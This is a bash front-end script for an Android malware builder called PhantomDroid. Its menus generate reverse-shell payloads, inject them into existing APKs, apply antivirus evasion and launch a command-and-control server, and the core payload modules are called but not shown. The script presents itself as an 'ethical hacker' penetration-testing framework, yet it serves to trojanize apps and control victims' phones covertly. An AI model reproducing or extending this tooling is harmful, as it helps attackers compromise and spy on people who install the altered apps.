#!/bin/bash

# PhantomDroid Framework v2.0
# Advanced Android Payload Generation System
# Author: M DHARAN RAJ - Web Developer & Ethical Hacker

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Framework paths
PHANTOM_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CORE_DIR="$PHANTOM_ROOT/core"
PAYLOAD_DIR="$PHANTOM_ROOT/payloads"
TOOLS_DIR="$PHANTOM_ROOT/tools"
OUTPUT_DIR="$PHANTOM_ROOT/output"
CONFIG_DIR="$PHANTOM_ROOT/config"
LOG_DIR="$PHANTOM_ROOT/logs"

# Global variables
LHOST=""
LPORT=""
TARGET_APK=""
PAYLOAD_TYPE=""
EVASION_LEVEL="medium"
DEBUG_MODE=false
VERBOSE_MODE=false

# Create necessary directories
create_directories() {
    mkdir -p "$OUTPUT_DIR" "$LOG_DIR" "$CONFIG_DIR"
    mkdir -p "$CORE_DIR" "$PAYLOAD_DIR" "$TOOLS_DIR"
    mkdir -p "$OUTPUT_DIR/payloads" "$OUTPUT_DIR/signed" "$OUTPUT_DIR/temp"
}

# Logging function
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" >> "$LOG_DIR/phantomdroid.log"
    
    if [[ "$VERBOSE_MODE" == true ]] || [[ "$level" == "ERROR" ]]; then
        case "$level" in
            "INFO") echo -e "${CYAN}[INFO]${NC} $message" ;;
            "WARN") echo -e "${YELLOW}[WARN]${NC} $message" ;;
            "ERROR") echo -e "${RED}[ERROR]${NC} $message" ;;
            "SUCCESS") echo -e "${GREEN}[SUCCESS]${NC} $message" ;;
            "DEBUG") [[ "$DEBUG_MODE" == true ]] && echo -e "${PURPLE}[DEBUG]${NC} $message" ;;
        esac
    fi
}

# Banner display
show_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "EOF"
 ██████╗██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
           M DHARAN RAJ - WEB DEVELOPER & ETHICAL HACKER
EOF
    echo -e "${NC}"
    echo -e "${CYAN}Advanced Android Penetration Testing Framework${NC}"
    echo -e "${WHITE}Created by: M DHARAN RAJ - Web Developer & Ethical Hacker${NC}"
    echo -e "${YELLOW}═══════════════════════════════════════════════${NC}"
    echo
}

# Check dependencies
check_dependencies() {
    log "INFO" "Checking system dependencies..."
    
    local deps=("python3" "java" "aapt" "zipalign" "apktool" "keytool")
    local missing_deps=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing_deps+=("$dep")
        fi
    done
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        log "ERROR" "Missing dependencies: ${missing_deps[*]}"
        echo -e "${RED}Missing dependencies detected!${NC}"
        echo -e "${YELLOW}Please install: ${missing_deps[*]}${NC}"
        echo -e "${CYAN}Run: sudo ./install.sh${NC}"
        exit 1
    fi
    
    log "SUCCESS" "All dependencies satisfied"
}

# Main menu
show_main_menu() {
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║                    PHANTOMDROID MAIN MENU                    ║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}1.${NC} ${CYAN}Generate Standalone Payload${NC}                            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}2.${NC} ${CYAN}Bind Payload to Existing APK${NC}                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}3.${NC} ${CYAN}Advanced AV Evasion Payload${NC}                           ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}4.${NC} ${CYAN}Steganographic Payload${NC}                                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}5.${NC} ${CYAN}Social Engineering Kit${NC}                               ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}6.${NC} ${CYAN}Start C2 Server${NC}                                       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}7.${NC} ${CYAN}APK Forensics & Analysis${NC}                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}8.${NC} ${CYAN}Batch Payload Generation${NC}                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}9.${NC} ${CYAN}Framework Configuration${NC}                               ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}10.${NC} ${CYAN}Web Interface${NC}                                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}11.${NC} ${CYAN}Clean Workspace${NC}                                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}0.${NC} ${RED}Exit Framework${NC}                                        ${WHITE}║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo
}

# Generate standalone payload
generate_standalone_payload() {
    echo -e "${CYAN}═══ Standalone Payload Generation ═══${NC}"
    
    # Get payload configuration
    read -p "Enter LHOST (listening IP): " LHOST
    read -p "Enter LPORT (listening port): " LPORT
    
    echo -e "${YELLOW}Select payload type:${NC}"
    echo "1. TCP Reverse Shell"
    echo "2. HTTP/HTTPS Shell"
    echo "3. DNS Tunneling"
    echo "4. SMS Command Shell"
    read -p "Choice [1-4]: " payload_choice
    
    case $payload_choice in
        1) PAYLOAD_TYPE="tcp_reverse" ;;
        2) PAYLOAD_TYPE="http_shell" ;;
        3) PAYLOAD_TYPE="dns_tunnel" ;;
        4) PAYLOAD_TYPE="sms_shell" ;;
        *) log "ERROR" "Invalid payload type"; return 1 ;;
    esac
    
    log "INFO" "Generating $PAYLOAD_TYPE payload for $LHOST:$LPORT"
    
    # Call Python payload generator
    python3 "$CORE_DIR/payload_generator.py" \
        --type "$PAYLOAD_TYPE" \
        --lhost "$LHOST" \
        --lport "$LPORT" \
        --output "$OUTPUT_DIR/payloads" \
        --evasion "$EVASION_LEVEL"
    
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "Payload generated successfully"
        echo -e "${GREEN}Payload saved to: $OUTPUT_DIR/payloads/${NC}"
    else
        log "ERROR" "Payload generation failed"
        return 1
    fi
}

# Bind payload to existing APK
bind_payload_to_apk() {
    echo -e "${CYAN}═══ APK Payload Binding ═══${NC}"
    
    read -p "Enter path to original APK: " TARGET_APK
    
    if [[ ! -f "$TARGET_APK" ]]; then
        log "ERROR" "APK file not found: $TARGET_APK"
        return 1
    fi
    
    read -p "Enter LHOST: " LHOST
    read -p "Enter LPORT: " LPORT
    
    echo -e "${YELLOW}Select binding method:${NC}"
    echo "1. Smart Injection (Recommended)"
    echo "2. Resource Hijacking"
    echo "3. Code Cave Injection"
    echo "4. Certificate Spoofing"
    read -p "Choice [1-4]: " bind_method
    
    log "INFO" "Binding payload to $TARGET_APK using method $bind_method"
    
    # Call Python APK binder
    python3 "$CORE_DIR/apk_binder.py" \
        --apk "$TARGET_APK" \
        --lhost "$LHOST" \
        --lport "$LPORT" \
        --method "$bind_method" \
        --output "$OUTPUT_DIR/signed" \
        --evasion "$EVASION_LEVEL"
    
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "APK binding completed successfully"
        echo -e "${GREEN}Modified APK saved to: $OUTPUT_DIR/signed/${NC}"
    else
        log "ERROR" "APK binding failed"
        return 1
    fi
}

# Advanced AV evasion
advanced_av_evasion() {
    echo -e "${CYAN}═══ Advanced AV Evasion ═══${NC}"
    
    echo -e "${YELLOW}Select evasion level:${NC}"
    echo "1. Basic (Signature randomization)"
    echo "2. Medium (Code obfuscation + API hiding)"
    echo "3. High (Polymorphic + Anti-analysis)"
    echo "4. Extreme (AI-powered + Zero-day techniques)"
    read -p "Choice [1-4]: " evasion_choice
    
    case $evasion_choice in
        1) EVASION_LEVEL="basic" ;;
        2) EVASION_LEVEL="medium" ;;
        3) EVASION_LEVEL="high" ;;
        4) EVASION_LEVEL="extreme" ;;
        *) log "ERROR" "Invalid evasion level"; return 1 ;;
    esac
    
    log "INFO" "Applying $EVASION_LEVEL evasion techniques"
    
    # Call Python evasion module
    python3 "$CORE_DIR/av_evasion.py" \
        --level "$EVASION_LEVEL" \
        --input "$OUTPUT_DIR/payloads" \
        --output "$OUTPUT_DIR/evaded"
    
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "AV evasion applied successfully"
    else
        log "ERROR" "AV evasion failed"
        return 1
    fi
}

# Start C2 server
start_c2_server() {
    echo -e "${CYAN}═══ Command & Control Server ═══${NC}"
    
    read -p "Enter C2 listening port [8080]: " c2_port
    c2_port=${c2_port:-8080}
    
    echo -e "${YELLOW}Select C2 protocol:${NC}"
    echo "1. HTTP/HTTPS"
    echo "2. DNS Tunneling"
    echo "3. Multi-Protocol"
    read -p "Choice [1-3]: " c2_protocol
    
    log "INFO" "Starting C2 server on port $c2_port"
    
    # Start C2 server in background
    python3 "$CORE_DIR/c2_server.py" \
        --port "$c2_port" \
        --protocol "$c2_protocol" \
        --log-dir "$LOG_DIR" &
    
    C2_PID=$!
    echo "$C2_PID" > "$LOG_DIR/c2.pid"
    
    log "SUCCESS" "C2 server started (PID: $C2_PID)"
    echo -e "${GREEN}C2 server running on port $c2_port${NC}"
}

# Clean workspace
clean_workspace() {
    echo -e "${YELLOW}Cleaning workspace...${NC}"
    
    rm -rf "$OUTPUT_DIR/temp"/*
    rm -rf "$OUTPUT_DIR/payloads"/*
    rm -rf "$OUTPUT_DIR/signed"/*
    
    # Stop C2 server if running
    if [[ -f "$LOG_DIR/c2.pid" ]]; then
        C2_PID=$(cat "$LOG_DIR/c2.pid")
        kill "$C2_PID" 2>/dev/null
        rm -f "$LOG_DIR/c2.pid"
        log "INFO" "C2 server stopped"
    fi
    
    log "SUCCESS" "Workspace cleaned"
    echo -e "${GREEN}Workspace cleaned successfully${NC}"
}

# Parse command line arguments
parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --interactive)
                INTERACTIVE_MODE=true
                shift
                ;;
            --payload)
                PAYLOAD_TYPE="$2"
                shift 2
                ;;
            --lhost)
                LHOST="$2"
                shift 2
                ;;
            --lport)
                LPORT="$2"
                shift 2
                ;;
            --target)
                TARGET_APK="$2"
                shift 2
                ;;
            --evasion)
                EVASION_LEVEL="$2"
                shift 2
                ;;
            --debug)
                DEBUG_MODE=true
                shift
                ;;
            --verbose)
                VERBOSE_MODE=true
                shift
                ;;
            --help|-h)
                show_help
                exit 0
                ;;
            *)
                log "ERROR" "Unknown argument: $1"
                show_help
                exit 1
                ;;
        esac
    done
}

# Show help
show_help() {
    echo -e "${CYAN}PhantomDroid Framework v2.0 - Usage${NC}"
    echo
    echo "Interactive Mode:"
    echo "  ./phantomdroid.sh --interactive"
    echo
    echo "Command Line Mode:"
    echo "  ./phantomdroid.sh --payload tcp --lhost 192.168.1.100 --lport 4444"
    echo "  ./phantomdroid.sh --target app.apk --lhost 192.168.1.100 --lport 4444"
    echo
    echo "Options:"
    echo "  --payload TYPE     Payload type (tcp, http, dns, sms)"
    echo "  --lhost IP         Listening host IP address"
    echo "  --lport PORT       Listening port number"
    echo "  --target APK       Target APK file for binding"
    echo "  --evasion LEVEL    Evasion level (basic, medium, high, extreme)"
    echo "  --debug            Enable debug mode"
    echo "  --verbose          Enable verbose output"
    echo "  --help, -h         Show this help message"
}

# Main function
main() {
    # Initialize framework
    create_directories
    
    # Parse arguments
    parse_arguments "$@"
    
    # Check dependencies
    check_dependencies
    
    # Show banner
    show_banner
    
    # Interactive mode
    if [[ "$INTERACTIVE_MODE" == true ]] || [[ $# -eq 0 ]]; then
        while true; do
            show_main_menu
            read -p "Select option [0-11]: " choice
            
            case $choice in
                1) generate_standalone_payload ;;
                2) bind_payload_to_apk ;;
                3) advanced_av_evasion ;;
                4) echo -e "${YELLOW}Steganographic payload - Coming soon!${NC}" ;;
                5) echo -e "${YELLOW}Social engineering kit - Coming soon!${NC}" ;;
                6) start_c2_server ;;
                7) echo -e "${YELLOW}APK forensics - Coming soon!${NC}" ;;
                8) echo -e "${YELLOW}Batch generation - Coming soon!${NC}" ;;
                9) echo -e "${YELLOW}Configuration - Coming soon!${NC}" ;;
                10) 
                    echo -e "${CYAN}Starting web interface...${NC}"
                    python3 "$CORE_DIR/web_interface.py" &
                    echo -e "${GREEN}Web interface available at: http://localhost:8080${NC}"
                    ;;
                11) clean_workspace ;;
                0) 
                    echo -e "${GREEN}Thank you for using PhantomDroid!${NC}"
                    clean_workspace
                    exit 0
                    ;;
                *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
            esac
            
            echo
            read -p "Press Enter to continue..."
        done
    else
        # Command line mode
        if [[ -n "$TARGET_APK" ]]; then
            bind_payload_to_apk
        elif [[ -n "$PAYLOAD_TYPE" ]]; then
            generate_standalone_payload
        else
            log "ERROR" "Insufficient arguments for command line mode"
            show_help
            exit 1
        fi
    fi
}

# Trap signals for cleanup
trap 'clean_workspace; exit 130' INT TERM

# Run main function
main "$@"
